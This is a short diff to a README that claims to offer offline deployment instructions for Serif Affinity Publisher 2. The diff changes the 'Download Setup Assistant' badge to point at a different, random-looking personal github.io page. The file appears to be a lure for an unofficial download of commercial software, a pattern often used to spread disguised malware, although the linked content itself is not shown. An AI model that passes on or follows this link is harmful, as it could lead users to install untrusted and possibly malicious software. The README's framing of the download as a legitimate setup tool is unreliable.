@@ -2,7 +2,7 @@
 
 Offline deployment instructions for **Serif Affinity Publisher 2**. Designed for users and organizations operating in air-gapped or secured environments.
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://affinity-publisher-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/affinitypublisher)
 
 ---
 
